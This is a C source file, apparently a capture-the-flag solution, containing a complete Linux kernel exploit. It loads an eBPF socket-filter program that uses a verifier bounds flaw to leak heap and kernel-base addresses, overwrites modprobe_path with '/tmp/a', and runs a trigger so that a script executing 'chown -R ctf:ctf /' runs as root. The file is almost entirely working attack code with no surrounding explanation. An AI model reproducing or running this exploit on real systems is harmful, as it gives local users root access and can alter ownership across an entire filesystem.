#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include "bpf_insn.h"

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int bpf(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}
int map_create(int val_size, int max_entries) {
  union bpf_attr attr = {
    .map_type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(int),
    .value_size = val_size,
    .max_entries = max_entries
  };
  int mapfd = bpf(BPF_MAP_CREATE, &attr);
  if (mapfd == -1) fatal("bpf(BPF_MAP_CREATE)");
  return mapfd;
}

int map_update(int mapfd, int key, void *pval) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)pval,
    .flags = BPF_ANY
  };
  int res = bpf(BPF_MAP_UPDATE_ELEM, &attr);
  if (res == -1) fatal("bpf(BPF_MAP_UPDATE_ELEM)");
  return res;
}

int map_lookup(int mapfd, int key, void *pval) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)pval,
    .flags = BPF_ANY
  };
  return bpf(BPF_MAP_LOOKUP_ELEM, &attr); // -1 if not found
}

int main() {
  char verifier_log[0x10000];
  unsigned long val;
  int mapfd = map_create(8, 0x10);
  val = 0x1337;
  map_update(mapfd, 0, &val);

  struct bpf_insn insns[] = {
    // grab map pointer and unkown value
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0),      // key=0
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(), 
    
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),   // R6 = map[0]
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),            // R7 = &map[0]
    
    // r9 heap leak
    // self addr is stored at (&map[0] - 0x88)
    BPF_MOV64_IMM(BPF_REG_1, 0x1),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 0b0111),    // R6 &= 0b0111
    BPF_ALU64_REG(BPF_RSH, BPF_REG_1, BPF_REG_2), // R7 >>= R0
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),    // R6 &= 0b0111
    BPF_ALU64_IMM(BPF_AND, BPF_REG_1, 1),
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 0x88),
    BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_1),
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, 0), // R9 = [R7] : heap leak
    
    // r8 kbase leak
    // ops table addr is stored at (&map[0] - 0xf8)
    BPF_MOV64_IMM(BPF_REG_1, 0x1),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 0b0111),    // R6 &= 0b0111
    BPF_ALU64_REG(BPF_RSH, BPF_REG_1, BPF_REG_2), // R7 >>= R0
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),    // R6 &= 0b0111
    BPF_ALU64_IMM(BPF_AND, BPF_REG_1, 1),
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 0x70),
    BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_1),
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // R8 = [R7] : kbase leak
    
    // calc diff between modprobepath --> map ops
    // r8 -= 0xc1d9a0 (kbase) 
    // r8 += 0x10be1e0 (modprobepath)
    // r8 -= r9 (heap)
    // r8 += 0x70 (offset from ops to &map[0]) 
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xc1d9a0),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x10be1e0),
    BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_9),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x70),
    
    // pointer add & write modprobepath
    BPF_MOV64_IMM(BPF_REG_1, 0x1),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 0b0111),    // R6 &= 0b0111
    BPF_ALU64_REG(BPF_RSH, BPF_REG_1, BPF_REG_2), // R7 >>= R0
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),    // R6 &= 0b0111
    BPF_ALU64_IMM(BPF_AND, BPF_REG_1, 1),
    BPF_ALU64_REG(BPF_MUL, BPF_REG_1, BPF_REG_8),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_1),

    BPF_MOV64_IMM(BPF_REG_1, 0x706d742f),
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0),
    
    // write
    BPF_MOV64_IMM(BPF_REG_1, 0x1),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 0b0111),    // R6 &= 0b0111
    BPF_ALU64_REG(BPF_RSH, BPF_REG_1, BPF_REG_2), // R7 >>= R0
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),    // R6 &= 0b0111
    BPF_ALU64_IMM(BPF_AND, BPF_REG_1, 1),
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 0x4),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_1),

    BPF_MOV64_IMM(BPF_REG_1, 0x612f),
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0),


    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };

  union bpf_attr prog_attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"GPL v2",
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };

  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
  puts(verifier_log);
  if (progfd == -1) {
    fatal("bpf(BPF_PROG_LOAD)");
  }

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    fatal("socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    fatal("setsockopt");

  write(socks[1], "Hello", 5);

  system("echo -en '\\xff\\xff\\xff\\xff' > /tmp/b; chmod +x /tmp/b");
  system("echo '#!/bin/sh\nchown -R ctf:ctf /' > /tmp/a; chmod +x /tmp/a");
  system("/tmp/b");

  return 0;
}
